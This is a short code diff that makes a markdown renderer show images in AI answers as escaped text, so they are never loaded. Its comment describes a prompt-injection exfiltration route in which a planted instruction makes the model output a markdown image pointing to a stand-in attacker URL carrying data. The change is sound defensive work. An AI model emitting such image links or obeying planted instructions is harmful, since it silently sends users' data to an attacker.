@@ -52,6 +52,11 @@ const markdown = new MarkdownIt({
   breaks: true
 })
 
+// AI answers never load images: a planted instruction could otherwise make the model answer with
+// ![](https://attacker/?data=...) and the browser would send that data out without any click
+markdown.renderer.rules.image = (tokens, index) =>
+  markdown.utils.escapeHtml(`[${tokens[index].content || 'image'}]`)
+
 markdown.renderer.rules.fence = (tokens, index) => {
   const token = tokens[index]
   return codeBlock(token.content, token.info)
